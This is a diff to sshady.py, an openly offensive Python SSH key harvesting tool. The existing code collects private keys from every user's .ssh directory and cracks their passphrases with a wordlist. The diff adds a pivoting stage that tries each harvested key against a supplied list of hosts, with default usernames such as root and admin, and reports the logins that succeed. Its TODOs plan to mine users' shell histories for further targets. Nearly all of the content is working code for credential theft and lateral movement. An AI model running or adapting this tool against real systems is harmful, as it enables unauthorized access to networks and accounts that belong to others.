@@ -1,13 +1,20 @@
 #!/usr/bin/env python
 
 """
-sshady.py -- SSH key harvesting things.
+sshady.py -- SSH key harvesting and pivoting things.
           -- by Daniel Roberson @dmfroberson
 TODO:
   - Cracking improvements
     -- Determine key type to avoid trying all of them.
     -- threading?
-- Attempt to login to supplied hosts using captured keys (nmap output as input!)
+  - Attempt to login to supplied hosts using captured keys
+    -- Nmap XML/greppable output as input?
+    -- grep users shell histories for hosts they've connected to?
+       - also glean usernames from this!!
+    -- Supply an input list for hosts/usernames
+       - Create unique list based on pwent for use on current network
+  - Input directory full of keys, or specify /home rather than searching pwents
+  - General cleanup
 
 Requires:
   - paramiko
@@ -20,11 +27,16 @@ import argparse
 import paramiko
 
 
-# Globals
+# Globals/Settings
 WORDLIST = "wordlist.txt"
 TERSE = False
 CRACK = True
 OUTDIR = None
+HOSTFILE = None
+USERFILE = None
+
+USERS = ["root", "nagios", "admin", "guest", "www", "www-data", "rsync"]
+VALID_KEYS = []
 
 
 def xprint(message):
@@ -69,6 +81,7 @@ def crack_key(keyfile, username, wordlist):
     if type(result) == str:
         xprint("      [+] Success! %s:%s" % (keyfile, username))
         terseprint("%s %s" % (keyfile, username))
+        VALID_KEYS.append((username, keyfile, username))
         return True
 
     # Try with wordlist.
@@ -82,6 +95,7 @@ def crack_key(keyfile, username, wordlist):
             if type(result) == str:
                 xprint("      [+] Success! %s:%s" % (keyfile, result))
                 terseprint("%s %s" % (keyfile, result))
+                VALID_KEYS.append((username, keyfile, result))
                 return True
 
     xprint("      [-] Unable to crack SSH key with supplied wordlist.")
@@ -154,7 +168,46 @@ def process_key(keyfile, username):
         # No password
         xprint("  [+] %s appears to be a valid, passwordless key" % keyfile)
         terseprint("%s -- NO PASSWORD" % keyfile)
+        VALID_KEYS.append((username, keyfile, result))
+
         return True
+
+    return True
+
+
+def try_ssh_key_login(username, keyfile, password, host, port=22):
+    """ try_ssh_key_login() -- Attempts an SSH login using supplied credentials
+
+    Args:
+        username (str) - Username
+        password (str) - Password for SSH key
+
+    Returns:
+        True if the login was successful
+        False otherwise
+    """
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # TODO: make sure this is valid. (try DSS, etc)
+    key = paramiko.RSAKey.from_private_key_file(keyfile, password=password)
+
+    try:
+        client.connect(
+            host,
+            username=username,
+            port=port,
+            pkey=key,
+            allow_agent=False,
+            look_for_keys=False)
+    except paramiko.ssh_exception.AuthenticationException:
+        return False
+    except paramiko.ssh_exception.SSHException:
+        # TODO: Handle this properly. Happens when host isnt running SSH
+        return False
+    except paramiko.ssh_exception.NoValidConnectionsError:
+        # TODO: Handle this properly. Happens when cant connect.
+        return False
 
     return True
 
@@ -192,6 +245,16 @@ def parse_cli():
                         help="Optional directory to save keys to",
                         required=False,
                         default=None)
+    parser.add_argument("-f",
+                        "--hosts",
+                        help="File containing list of hosts to try discovered keys. Format: \"ip.address port\" (port optional)",
+                        required=False,
+                        default=None)
+    parser.add_argument("-u",
+                        "--users",
+                        help="File containing list of usernames to try",
+                        required=False,
+                        default=None)
 
     args = parser.parse_args()
     return args
@@ -211,12 +274,17 @@ def main():
     global TERSE
     global CRACK
     global OUTDIR
+    global USERS
+    global HOSTFILE
+    global USERFILE
 
     args = parse_cli()
     WORDLIST = args.wordlist
     TERSE = args.terse
     CRACK = args.nocrack
     OUTDIR = args.directory
+    HOSTFILE = args.hosts
+    USERFILE = args.users
 
     xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
     xprint("")
@@ -245,6 +313,7 @@ def main():
     xprint("[+] Searching for SSH keys..")
     xprint("")
 
+    # Search for users passwords.
     for pwent in pwd.getpwall():
         user = pwent[0]
         sshdir = os.path.join(os.path.expanduser("~%s" % user), ".ssh")
@@ -255,6 +324,55 @@ def main():
                 for filename in filenames:
                     checkfile = os.path.join(root, filename)
                     process_key(checkfile, user)
+
+    xprint("")
+    xprint("[+] %s keys discovered." % len(VALID_KEYS))
+
+    # If a hostfile is specified, loop through hosts and try to login with
+    # each of the harvested keys.
+    if HOSTFILE:
+        xprint("")
+        xprint("[+] Attempting to login to hosts using discovered keys..")
+
+        # Get list of hostnames from file, if specified
+        try:
+            hosts = [line.rstrip(os.linesep) for line in open(HOSTFILE)]
+        except IOError, err:
+            xprint("  [-] Unable to open host list %s: %s" % (HOSTFILE, err))
+            xprint("  [-] Exiting.")
+            return os.EX_USAGE
+
+        # Get list of usernames from file, if specified
+        # TODO: make sure usernames are valid.
+        if USERFILE:
+            try:
+                USERS = [line.rstrip(os.linesep) for line in open(USERFILE)]
+            except IOError, err:
+                xprint("  [-] Unable to open user list %s: %s" % \
+                       (USERFILE, err))
+                xprint("  [-] Exiting.")
+                return os.EX_USAGE
+
+        for host in hosts:
+            port = 22
+            if " " in host:
+                port = int(host.split()[1])
+                host = host.split()[0]
+            xprint("  [*] Trying %s:%s" % (host, port))
+
+            for key in VALID_KEYS:
+                username, keyfile, password = key
+
+                # Try username first
+                if try_ssh_key_login(username, keyfile, password, host, port):
+                    xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
+                           (username, host, keyfile, password))
+
+                # Try list of usernames now.
+                for user in USERS:
+                    if try_ssh_key_login(user, keyfile, password, host, port):
+                        xprint("    [+] %s@%s -- %s:%s LOGIN SUCCESSFUL!" % \
+                               (user, host, keyfile, password))
 
     xprint("")
     xprint("[+] You must defeat Sheng Long to stand a chance.")
